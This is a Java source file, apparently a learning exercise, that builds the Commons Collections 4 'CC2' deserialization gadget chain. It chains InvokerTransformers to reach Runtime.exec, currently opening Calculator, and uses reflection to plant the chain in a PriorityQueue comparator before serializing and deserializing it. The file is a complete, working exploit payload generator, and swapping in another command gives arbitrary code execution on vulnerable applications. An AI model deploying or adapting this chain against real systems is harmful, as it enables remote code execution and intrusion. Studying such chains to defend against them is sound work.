package com.rain;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers={
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class<TransformingComparator> clazz = TransformingComparator.class;
        Field transformerField = clazz.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator,chainedTransformer);
        Utils.serialize(priorityQueue);
        Utils.deserialize();

    }
}
